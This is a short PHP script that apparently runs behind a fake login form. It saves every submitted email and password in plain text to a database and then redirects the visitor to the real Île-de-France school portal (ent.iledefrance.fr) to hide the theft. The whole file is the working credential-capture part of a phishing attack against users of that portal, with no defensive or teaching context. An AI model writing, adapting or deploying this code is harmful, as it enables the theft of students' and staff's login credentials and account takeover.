<?php
include("utils/connexionDB.php");

if(isset($_POST["connexion"])) {
    $login = $_POST["email"];
    $mdp = $_POST["password"];
    $date = date('Y-m-d H:i:s');
    
    $create = $DB->prepare("INSERT INTO utilisateur (login, mdp, date_login) VALUES (:login, :mdp, :date_login)");

    $create->bindValue(":login", $login);
    $create->bindValue(":mdp", $mdp);
    $create->bindValue(":date_login", $date);

    $create->execute();

    header("Location: https://ent.iledefrance.fr/");
} else {
    header("Location: index.php?erreur=05518698SHA5181ASS8S53SA");
}